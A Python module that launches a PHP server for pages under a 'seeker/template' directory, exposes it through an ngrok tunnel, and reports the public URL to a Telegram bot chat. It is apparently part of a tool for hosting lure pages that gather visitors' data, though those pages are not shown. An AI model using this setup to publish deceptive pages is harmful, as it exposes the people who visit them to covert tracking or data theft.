import requests
import subprocess
import threading
import time

def run_ngrok(chat_id, bot):
    try:
        # Run ngrok using subprocess
        ngrok_process = subprocess.Popen(["ngrok", "http", "4001"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Read ngrok's output in a separate thread
        def read_ngrok_output():
            
            while True:
                ngrok_output = ngrok_process.stdout.readline().decode().strip()
                if "Forwarding" in ngrok_output:
                    
                    http_address = ngrok_output.split(' ')[1]
                    bot.send_message(chat_id, f"Ngrok HTTP address: {http_address}")

        ngrok_thread = threading.Thread(target=read_ngrok_output)
        ngrok_thread.start()

        ngrok_process.wait()  # Wait for ngrok to start

    except Exception as e:
         bot.send_message(chat_id, f"An error occurred: {str(e)}")

def seekServer(LOG_FILE, port, SITE, subp, sleep, cl_quit, bot, chat_id):
    print()
    preoc = False
    print(f'[+] Port : {port}\n')
    print(f'[+] Starting PHP Server...', end='', flush=True)
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'seeker/template/{SITE}/']

    with open(LOG_FILE, 'w+') as phplog:
        proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
        time.sleep(3)
        phplog.seek(0)
        run_ngrok_thread = threading.Thread(target=run_ngrok, args=(chat_id, bot))
        run_ngrok_thread.start()

        if 'Address already in use' in phplog.readline():
            preoc = True
        try:
            php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
            php_sc = php_rqst.status_code

            if php_sc == 200:
                if preoc:
                    
                    print(f'[ ✔ ]')
                    print(f'[!] Server is already running!')
                    print()
                else:
                    bot.send_message(chat_id, "✅ Сервер запущен! ✅")
                    print(f'[ ✔ ]')
                    print()
            else:
                print(f'[ Status : {php_sc} ]')
                cl_quit(proc)
        except requests.ConnectionError:
            print(f'[ ✘ ]')
            cl_quit(proc)
    return proc
